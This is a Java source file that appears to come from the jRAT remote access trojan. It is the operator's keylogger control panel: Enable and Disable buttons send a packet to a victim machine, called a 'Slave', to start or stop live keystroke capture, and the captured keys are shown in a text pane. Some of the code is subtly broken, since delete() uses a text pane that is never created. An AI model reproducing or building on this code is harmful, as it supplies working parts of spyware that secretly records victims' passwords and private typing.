package jrat.module.keys.ui;

import jrat.api.Resources;
import jrat.api.ui.ClientPanel;
import jrat.controller.Slave;
import jrat.module.keys.packets.PacketToggleLive;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.tree.DefaultMutableTreeNode;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

@SuppressWarnings("serial")
public class PanelKeylogger extends ClientPanel {
	
	public JTextPane offlineTextPane;
	private final ButtonGroup buttonGroup = new ButtonGroup();
	private JCheckBox chckbxDeleteCharOn;
	
	private Style title;
	private Style date;

	private JTextPane onlineTextPane;
	private DefaultMutableTreeNode root;

	public PanelKeylogger(Slave client) {
		super(client, "Keys", Resources.getIcon("keyboard"));

		JToggleButton tglbtnEnable = new JToggleButton("Enable");
		tglbtnEnable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				toggleLive(true);
			}
		});
		buttonGroup.add(tglbtnEnable);

		JToggleButton tglbtnDisable = new JToggleButton("Disable");
		tglbtnDisable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				toggleLive(false);
			}
		});
		buttonGroup.add(tglbtnDisable);
		tglbtnDisable.setSelected(true);

		chckbxDeleteCharOn = new JCheckBox("Delete char on backspace");

		JScrollPane scrollPane_1 = new JScrollPane();

		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);

		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(tglbtnEnable).addPreferredGap(ComponentPlacement.RELATED).addComponent(tglbtnDisable).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(chckbxDeleteCharOn)).addGroup(groupLayout.createSequentialGroup().addGap(1).addComponent(scrollPane_1, GroupLayout.PREFERRED_SIZE, 128, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 305, Short.MAX_VALUE))).addContainerGap()));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addComponent(tabbedPane, GroupLayout.DEFAULT_SIZE, 359, Short.MAX_VALUE).addComponent(scrollPane_1, GroupLayout.DEFAULT_SIZE, 254, Short.MAX_VALUE)).addPreferredGap(ComponentPlacement.RELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(tglbtnEnable).addComponent(tglbtnDisable).addComponent(chckbxDeleteCharOn)).addGap(15)));

		JScrollPane onlineScrollPane = new JScrollPane();
		onlineScrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
		onlineScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		tabbedPane.addTab("Live", Resources.getIcon("online"), onlineScrollPane, null);

		onlineTextPane = new JTextPane();
		onlineTextPane.setEditable(false);
		onlineScrollPane.setViewportView(onlineTextPane);

		title = onlineTextPane.addStyle("title", null);
		StyleConstants.setForeground(title, Color.green.darker());
		
		date = onlineTextPane.addStyle("date", null);
		StyleConstants.setForeground(date, Color.blue);

		root = new DefaultMutableTreeNode("Logs");
		setLayout(groupLayout);
    }

	public void toggleLive(boolean enabled) {
	    slave.addToSendQueue(new PacketToggleLive(enabled));
    }

	public synchronized void delete() throws Exception {
		String text = offlineTextPane.getText().trim();
		if (text.endsWith("]")) {
			offlineTextPane.getStyledDocument().remove(text.lastIndexOf("["), text.lastIndexOf("]") - text.lastIndexOf("[") + 1);
		} else {
			offlineTextPane.getStyledDocument().remove(offlineTextPane.getDocument().getLength() - 1, 1);
		}
	}

	public synchronized void appendOnline(String key) {
		try {
			if (key.equals("[BACKSPACE]") && chckbxDeleteCharOn.isSelected()) {
				delete();
				return;
			}

            onlineTextPane.getStyledDocument().insertString(onlineTextPane.getStyledDocument().getLength(), key.length() == 1 ? key : key + " ", null);
		} catch (Exception e) {
			e.printStackTrace();
		}

		onlineTextPane.setSelectionStart(onlineTextPane.getDocument().getLength());
		onlineTextPane.setSelectionEnd(onlineTextPane.getDocument().getLength());

	}
}
